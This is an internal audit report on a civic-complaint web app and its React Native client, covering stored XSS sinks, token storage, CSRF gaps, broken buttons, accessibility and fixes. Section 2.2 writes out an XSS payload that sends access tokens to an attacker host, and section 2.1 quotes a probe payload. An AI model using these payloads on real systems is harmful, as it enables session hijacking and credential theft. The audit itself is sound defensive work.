# AUDIT_05D: Frontend (Web Templates, CSS, JS) and Mobile App Audit

**Date**: 2026-11-05  
**Auditor**: Senior Adversarial Frontend & Mobile Systems Auditor (Read-Only)  
**Target Scope**: 
- Web Frontend: Jinja templates (`templates/`), Vanilla CSS (`static/css/`), Vanilla JS (`static/js/`)
- Mobile Application: React Native / Expo (`smartcivic-mobile/`)
**Execution Verification**: All findings are verified by empirical test scripts (`audit_tmp/test_frontend.py`, `audit_tmp/probe_xss.py`, `audit_tmp/test_mobile_resolve.py`, `audit_tmp/test_a11y.py`), static analysis, and API endpoint verification.

---

## Executive Summary

The frontend architecture of SmartCivic exhibits severe security vulnerabilities, broken user journeys, scoping bugs, and mobile integration failures. 

### Critical Highlights:
1. **Pervasive Stored Cross-Site Scripting (XSS)**: User-controlled fields (`title`, `description`, `address`, `category`, `notes`) are interpolated directly into DOM sinks via `.innerHTML` without sanitization across the Citizen Dashboard (`static/js/citizen.js:426`), Officer Dashboard (`static/js/dashboard.js:290`), Leaflet Map Popups (`static/js/dashboard.js:532`), and the Toast Notification system (`static/js/toast.js:25`).
2. **Credential Exfiltration via LocalStorage**: JWT access and refresh tokens are stored in `localStorage` ([`static/js/auth.js:49`](file:///c:/Users/Muthaheer/Desktop/main%20project/code%201/static/js/auth.js#L49)), allowing any stored XSS payload to immediately exfiltrate full session credentials.
3. **Broken Interactive Buttons (Uncaught ReferenceError)**: In [`templates/report_issue.html:254`](file:///c:/Users/Muthaheer/Desktop/main%20project/code%201/templates/report_issue.html#L254), the CTVE modal buttons call `confirmCtveOriginal()` and `handleCtvePhotoUpload(this)`. However, both functions are declared inside the local closure of `submitIssue()` in [`static/js/citizen.js:216-259`](file:///c:/Users/Muthaheer/Desktop/main%20project/code%201/static/js/citizen.js#L216-L259). Clicking these buttons triggers an uncaught JavaScript runtime exception.
4. **Mobile App Resolution Endpoint Broken (HTTP 400)**: The React Native mobile client uploads repair proof using field name `'after_image'` ([`smartcivic-mobile/App.js:273`](file:///c:/Users/Muthaheer/Desktop/main%20project/code%201/smartcivic-mobile/App.js#L273)). The active backend handler ([`routes/api/issues.py:1107`](file:///c:/Users/Muthaheer/Desktop/main%20project/code%201/routes/api/issues.py#L1107)) strictly demands `'image'`, rejecting every mobile resolution submission with HTTP 400.
5. **Hardcoded Private IP in Mobile**: The mobile app hardcodes `http://10.30.128.225:5000/api` ([`smartcivic-mobile/src/services/api.js:5`](file:///c:/Users/Muthaheer/Desktop/main%20project/code%201/smartcivic-mobile/src/services/api.js#L5)). Any device outside this specific local subnet fails immediately on launch.
6. **Double Leaflet Script Injection**: [`templates/base.html`](file:///c:/Users/Muthaheer/Desktop/main%20project/code%201/templates/base.html) injects `https://unpkg.com/leaflet@1.9.4/dist/leaflet.js` twice on every single page (lines 26 and 494).

---

## 1. Page-by-Page Audit & User Journeys

| Page / Route | HTTP Status | Auth Requirement | Dead Links / 404s | Form & Validation Status | Double-Submit Protection | Verdict |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| **`/` (Index)** | 302 Redirect | None | Redirects to `/login` | N/A | N/A | ✅ Works (I ran it) |
| **`/login`** | 200 OK | None | Link to `/register` works | Client-side email/password required; inline submit handler | ✅ Enabled (`submit.disabled = true`) | ✅ Works (I ran it) |
| **`/register`** | 200 OK | None | Dead link if user hits `GET /auth/register` (405) | Multipart form; client validation; role switch | ❌ Missing (can spam submit) | ⚠️ Partial |
| **`/citizen/verify-ward`** | 200 OK | Citizen | None | Accepts area code; insecure server bypass | ❌ Missing | ⚠️ Partial |
| **`/citizen/dashboard`** | 200 OK | Citizen | None | Asynchronously loads issues via `GET /api/issues`; renders via innerHTML | N/A (read-only queue) | ❌ Missing/Broken (XSS) |
| **`/report` (`report_issue.html`)** | 200 OK | Citizen | CTVE buttons throw `ReferenceError` | Client GPS & description checks; missing `<label for>` attributes | ❌ Missing | ❌ Missing/Broken |
| **`/officer/dashboard`** | 200 OK | Officer | None | Loads queue, workers, simulation; renders via innerHTML | Buttons lack debouncing | ❌ Missing/Broken (XSS) |
| **`/worker/dashboard`** | 200 OK | Worker | None | Task list and GPS navigation triggers | N/A | ✅ Works (I ran it) |
| **`/map` (`live_map.html`)** | 200 OK | Public | None | Leaflet map with CartoDB tiles; auto-refreshes every 15s | N/A | ✅ Works (I ran it) |
| **`/transparency`** | 200 OK | Public | None | Displays public statistics | N/A | ✅ Works (I ran it) |
| **`/report-issue`** | 404 Not Found | Public | URL not registered (canonical is `/report`) | Dead route | N/A | ❌ Missing/Broken |
| **`/analytics`** | 404 Not Found | Public | No HTML view route (API is `/api/analytics`) | Dead route | N/A | ❌ Missing/Broken |
| **`templates/smartcivic_v2.html`** | N/A | Unlinked | Orphaned 2,986-line prototype file | Unreachable; 0 routes render it | N/A | ❌ Missing/Broken |

---

## 2. Security in the UI

### 2.1 Pervasive Stored Cross-Site Scripting (XSS)
Testing confirmed that the application performs no client-side escaping when rendering complaint data into the DOM:

1. **Citizen Dashboard Issue Cards**:
   - File: [`static/js/citizen.js:426-438`](file:///c:/Users/Muthaheer/Desktop/main%20project/code%201/static/js/citizen.js#L426-L438)
   - Code:
     ```javascript
     card.innerHTML = `
         <strong>${issue.title}</strong>
         <div>${issue.description}</div>
         <div>${issue.address || 'Address not specified'}</div>
     `;
     ```
   - Vulnerability: Injecting `<img src=x onerror=alert(1)>` into `title` or `description` executes JavaScript in the victim citizen's browser.

2. **Officer Dashboard Queue Cards**:
   - File: [`static/js/dashboard.js:285-296`](file:///c:/Users/Muthaheer/Desktop/main%20project/code%201/static/js/dashboard.js#L285-L296)
   - Code:
     ```javascript
     card.innerHTML = `
         <h4>${issue.title}</h4>
         <div>${issue.description}</div>
         <div><strong>Category:</strong> ${issue.category}</div>
         <div><strong>Issue Type:</strong> ${issue.type || 'other'}</div>
     `;
     ```
   - Vulnerability: Stored XSS executes directly inside the officer's browser, permitting session hijacking and administrative action forgery.

3. **Leaflet Map Marker Popups**:
   - File: [`static/js/dashboard.js:525-548`](file:///c:/Users/Muthaheer/Desktop/main%20project/code%201/static/js/dashboard.js#L525-L548)
   - Code:
     ```javascript
     const popupContent = `
         <h4>${issue.title}</h4>
         <em>${issue.original_description || issue.description}</em>
     `;
     marker.bindPopup(popupContent);
     ```
   - Vulnerability: Clicking any map marker on the dashboard renders unescaped HTML.

4. **Toast Notifications & Socket.IO Alerts**:
   - File: [`static/js/toast.js:22-28`](file:///c:/Users/Muthaheer/Desktop/main%20project/code%201/static/js/toast.js#L22-L28)
   - Code:
     ```javascript
     toast.innerHTML = `
         <span class="toast-message">${message}</span>
     `;
     ```
   - Vulnerability: Socket.IO events (`notification`, `sla_breach`, status changes) passing dynamic text execute scripts inside the toast container.

5. **Notification Dropdown Bell**:
   - File: [`templates/base.html:581`](file:///c:/Users/Muthaheer/Desktop/main%20project/code%201/templates/base.html#L581)
   - Code:
     ```javascript
     listEl.innerHTML = data.data.map(n => `<div>${n.message}</div>`).join('');
     ```
   - Vulnerability: Opening the notification bell renders raw notification strings into `innerHTML`.

### 2.2 Insecure Token Storage in LocalStorage
- In [`static/js/auth.js:47-56`](file:///c:/Users/Muthaheer/Desktop/main%20project/code%201/static/js/auth.js#L47-L56):
  `localStorage.setItem('sc_access_token', accessToken)` and `localStorage.setItem('sc_refresh_token', refreshToken)`.
- Tokens are exposed to client JavaScript. Combined with the Stored XSS vulnerabilities above, an attacker can extract tokens via:
  `<img src=x onerror="fetch('https://attacker.com/steal?t='+localStorage.getItem('sc_access_token'))">`
- HttpOnly cookies are not enforced for API communications.

### 2.3 CSRF Token Gaps on Forms
- While `CSRFProtect` is initialized in [`app.py:108`](file:///c:/Users/Muthaheer/Desktop/main%20project/code%201/app.py#L108), **every primary API blueprint is explicitly exempted**:
  `csrf.exempt(issues_api_bp)`, `csrf.exempt(workers_api_bp)`, `csrf.exempt(analytics_api_bp)`, `csrf.exempt(auth_bp)`, etc.
- In templates (`templates/auth/login.html`, `templates/auth/register.html`, `templates/auth/verify_ward.html`), `<form>` elements do not include `<input type="hidden" name="csrf_token" value="{{ csrf_token() }}">`. If a user submits a standard browser form POST without custom JavaScript headers, CSRF checks fail or are bypassed.

---

## 3. Code Quality & Architectural Redundancies

### 3.1 Lexical Scoping Defect in `static/js/citizen.js`
In [`templates/report_issue.html:250-254`](file:///c:/Users/Muthaheer/Desktop/main%20project/code%201/templates/report_issue.html#L250-L254):
```html
<input type="file" id="ctve-photo-upload" onchange="handleCtvePhotoUpload(this)">
<button onclick="confirmCtveOriginal()">
```
In [`static/js/citizen.js:185-285`](file:///c:/Users/Muthaheer/Desktop/main%20project/code%201/static/js/citizen.js#L185-L285), both functions are defined inside the `try` block of `submitIssue()`:
```javascript
async function submitIssue(e) {
    try {
        ...
        async function confirmCtveOriginal() { ... }
        async function handleCtvePhotoUpload(input) { ... }
    }
}
```
**Impact**: Because they are trapped in function closure, `window.confirmCtveOriginal` is `undefined`. Clicking the CTVE button throws `Uncaught ReferenceError: confirmCtveOriginal is not defined`.

### 3.2 Duplicate and Conflicting Global Functions
1. **Duplicate `showToast` Definition**:
   - `static/js/toast.js:5`: defines `function showToast(message, type = 'info', duration = 3500)` appending to `#toast-container`.
   - `templates/base.html:529`: defines `function showToast(message, type = 'info')` appending to `#toastContainer`.
   - Two competing toast functions exist in the global window object.
2. **Double Script Inclusion of Leaflet**:
   - `templates/base.html:26`: `<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>` in `<head>`.
   - `templates/base.html:494`: `<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>` at end of `<body>`.
   - Downloaded and executed twice on every request.
3. **Dead / Orphaned Auth Script**:
   - `static/js/auth.js` listens for form ID `#login-form`.
   - `templates/auth/login.html` uses form ID `#loginForm` and executes its own separate inline script (lines 121–159). `static/js/auth.js` is completely unreferenced.

### 3.3 Heavy Render-Blocking Font Bundle
In [`templates/base.html:18`](file:///c:/Users/Muthaheer/Desktop/main%20project/code%201/templates/base.html#L18):
```html
<link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@600;700&family=Inter:wght@400;500;600;700&family=Playfair+Display:ital,wght@0,600;0,700;0,800;1,600&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
```
5 distinct font families across 16 font weights are loaded synchronously in the critical path, degrading First Contentful Paint (FCP) and Time to Interactive (TTI).

---

## 4. Responsiveness & Accessibility (a11y)

### 4.1 Missing Breakpoints in Core CSS
- [`static/css/main.css`](file:///c:/Users/Muthaheer/Desktop/main%20project/code%201/static/css/main.css) contains **zero responsive layout media queries** (the only media query is `prefers-reduced-motion`).
- There are no mobile media queries for small phones (360px–480px).
- At 360px viewport:
  - Form containers in `report_issue.html` and `login.html` have fixed paddings that compress inputs to unusable widths.
  - Header actions in `base.html:450-484` overlap with the title and navigation links.
  - Queue cards on the dashboard have button groups (`style="display: flex; gap: 0.5rem;"`) that overflow horizontally off-screen.

### 4.2 WCAG 2.1 AA Accessibility Violations
1. **Unassociated Form Labels (Criterion 1.3.1, 4.1.2)**:
   - In [`templates/report_issue.html:69-130`](file:///c:/Users/Muthaheer/Desktop/main%20project/code%201/templates/report_issue.html#L69-L130), all inputs (`#language`, `#title`, `#description`, `#category`, `#type`, `#ward`, `#image`) are preceded by `<label class="form-label">` without a `for="..."` attribute matching the input ID.
   - Screen readers fail to announce form field labels.
2. **Severe Contrast Failures (Criterion 1.4.3 - Minimum 4.5:1)**:
   - Gold text `#c9a227` on white card surface `#ffffff`: Contrast ratio is **2.17:1** (Fails AA).
   - Light gold `#e7c76a` on white: Contrast ratio is **1.56:1** (Fails AA).
   - Muted text `#9e9bc2` on light background `#faf8f3`: Contrast ratio is **2.32:1** (Fails AA).
3. **Map Touch Accessibility**:
   - Leaflet map touch dragging in `report_issue.html` captures vertical swipe gestures, preventing mobile users from scrolling past the map without accidentally moving the location pin.

---

## 5. Mobile App Audit (`smartcivic-mobile/`)

### 5.1 Architecture & Packaging Defects
1. **Conflicting Hybrid Frameworks**:
   - `smartcivic-mobile/package.json` includes both Expo (`expo: ~51.0.0`) and Capacitor (`@capacitor/cli: ^8.5.2`, `@capacitor/core: ^8.5.2`).
   - `capacitor.config.json` exists alongside `app.json` and `eas.json`. This causes build pipeline confusion.
2. **Hardcoded LAN IPv4 Address**:
   - [`smartcivic-mobile/src/services/api.js:5`](file:///c:/Users/Muthaheer/Desktop/main%20project/code%201/smartcivic-mobile/src/services/api.js#L5):
     `export const DEFAULT_API_URL = 'http://10.30.128.225:5000/api';`
   - Mobile builds deployed to physical phones or emulators will fail network requests unless connected to that exact developer subnet.

### 5.2 Broken Resolution Endpoint (HTTP 400)
- In [`smartcivic-mobile/App.js:271-285`](file:///c:/Users/Muthaheer/Desktop/main%20project/code%201/smartcivic-mobile/App.js#L271-L285):
  ```javascript
  const formData = new FormData();
  formData.append('after_image', { uri: photo.uri, name: filename, type: 'image/jpeg' });
  const res = await api.post(`/issues/${taskId}/resolve`, formData, { headers: { 'Content-Type': 'multipart/form-data' } });
  ```
- In [`routes/api/issues.py:1090-1110`](file:///c:/Users/Muthaheer/Desktop/main%20project/code%201/routes/api/issues.py#L1090-L1110):
  The first registered route handler for `/api/issues/<id>/resolve` is `resolve_issue(id)`:
  ```python
  if 'image' not in request.files:
      return jsonify({"success": False, "error": {"code": "VALIDATION_ERROR", "message": "After resolution photo required."}}), 400
  ```
- **Empirical Test Result**: Running `audit_tmp/test_mobile_resolve.py` returned HTTP 400 `{"error": {"code": "VALIDATION_ERROR", "message": "After resolution photo required."}}`.
- **Verdict**: Mobile repair photo submission is completely broken.

### 5.3 Dead Offline SQLite Storage
- `package.json` installs `expo-sqlite: ~14.0.6`.
- A global grep across `smartcivic-mobile/` reveals **0 references to `expo-sqlite` or any database schema**.
- The app has no offline storage, offline task caching, or submission queue.

### 5.4 Feature Parity Deficit (Web vs Mobile)

| Feature | Web Frontend | Mobile App (`smartcivic-mobile/`) | Status |
| :--- | :--- | :--- | :--- |
| **Interactive Map & GIS** | Leaflet maps, clusters, heatmap | None (external link button only) | ❌ Missing in mobile |
| **Multi-Language (Kannada/Hindi)** | Supported via `i18n.js` | None (hardcoded English only) | ❌ Missing in mobile |
| **Real-time Push (Socket.IO)** | Connected to `/civic` namespace | None (30s polling for workers only) | ❌ Missing in mobile |
| **Community Upvoting ("I see this")**| Full modal & upvoting buttons | None | ❌ Missing in mobile |
| **Citizen Resolution Verification** | "Fixed" and "Reopen" buttons | None | ❌ Missing in mobile |
| **Officer Portal & Triage** | Full queue, dispatch, simulation | None (citizen/worker only) | ❌ Missing in mobile |
| **Secure Token Storage** | `localStorage` (insecure) | `expo-secure-store` (secure) | ✅ Mobile is better |

---

## 6. Screenshot Checklist (Unverified Visual/Touch Tests)

The following items cannot be fully verified via programmatic API calls and require manual physical inspection:
- [ ] Verify map pin touch drag precision and inertia on a physical 360px Android/iOS screen.
- [ ] Confirm no horizontal scrollbar or element overflow at 360px on `report_issue.html`.
- [ ] Verify physical camera launch and photo capture on iOS 17+ and Android 14+ via `expo-image-picker`.
- [ ] Confirm visual focus ring visibility when tabbing through dashboard controls using keyboard navigation.
- [ ] Inspect gold badge contrast and text readability on low-brightness OLED mobile screens.
- [ ] Confirm Leaflet marker popup readability when 5+ clusters overlap on mobile.

---

## Remediation Table

| ID | Severity | File:Line | Problem | Suggested Fix | Effort |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **FE-01** | **Critical** | `static/js/citizen.js:426-438` | Stored XSS: unescaped issue `title`, `description`, and `address` injected into `card.innerHTML`. | Create an `escapeHtml()` helper and sanitize all interpolated variables before DOM injection. | S |
| **FE-02** | **Critical** | `static/js/dashboard.js:290-296` | Stored XSS: unescaped issue fields injected into Officer Dashboard cards via `.innerHTML`. | Sanitize all complaint fields with `escapeHtml()` or use `textContent` DOM nodes. | S |
| **FE-03** | **Critical** | `static/js/dashboard.js:525-548` | Stored XSS: Leaflet marker popup HTML interpolates raw issue description and title. | Pass all marker popup strings through `escapeHtml()`. | S |
| **FE-04** | **Critical** | `static/js/toast.js:25` | Stored XSS: Toast messages from Socket.IO injected directly into `toast.innerHTML`. | Replace `.innerHTML` with `document.createTextNode(message)`. | S |
| **FE-05** | **Critical** | `smartcivic-mobile/App.js:273` | Mobile repair resolution broken: sends `'after_image'`, but backend route line 1107 demands `'image'`. | Accept both `'image'` and `'after_image'` in `routes/api/issues.py:1107` and `1566`. | S |
| **FE-06** | **High** | `static/js/citizen.js:216-259` | Uncaught ReferenceError: `confirmCtveOriginal` and `handleCtvePhotoUpload` defined inside `submitIssue()` closure. | Move both functions to top-level window scope in `citizen.js`. | S |
| **FE-07** | **High** | `static/js/auth.js:49-56` | Tokens stored in `localStorage`, making them vulnerable to exfiltration via XSS. | Migrate auth tokens to HttpOnly, SameSite=Lax session cookies. | M |
| **FE-08** | **High** | `smartcivic-mobile/src/services/api.js:5` | Hardcoded LAN IP `http://10.30.128.225:5000/api` breaks mobile app outside local network. | Use Expo `Constants.expoConfig.extra.apiUrl` or environment variable. | S |
| **FE-09** | **Medium** | `templates/base.html:26,494` | Duplicate Leaflet JS inclusion in both `<head>` and `<body>`. | Remove the duplicate `<script>` tag at line 494. | S |
| **FE-10** | **Medium** | `templates/base.html:529` vs `static/js/toast.js:5` | Duplicate, conflicting `showToast()` definitions in global scope. | Remove inline `showToast()` in `base.html` and standardize on `static/js/toast.js`. | S |
| **FE-11** | **Medium** | `templates/report_issue.html:69-130` | WCAG 2.1 AA failure: all form `<label>` tags lack `for` attributes. | Add `for="..."` attributes matching corresponding input IDs. | S |
| **FE-12** | **Medium** | `templates/base.html:18` | 5 Google font families across 16 weights loaded synchronously, blocking FCP. | Reduce font weights to 400/600; add `font-display: swap`. | S |
| **FE-13** | **Medium** | `static/css/main.css` | Zero responsive layout media queries for viewports <768px and 360px. | Add responsive mobile grid breakpoints for 360px and 768px. | M |
| **FE-14** | **Medium** | `templates/report_issue.html:67` | Form lacks double-submit protection; fast double-click fires duplicate submissions. | Disable submit button on click and show spinner state. | S |
| **FE-15** | **Low** | `templates/smartcivic_v2.html` | Orphaned 2,986-line prototype template left in production codebase. | Archive or delete `templates/smartcivic_v2.html`. | S |
| **FE-16** | **Low** | `smartcivic-mobile/package.json` | Hybrid conflict: Capacitor packages installed inside Expo project. | Remove `@capacitor/cli` and `@capacitor/core` from `smartcivic-mobile`. | S |

---
*End of AUDIT_05D_FRONTEND.md*

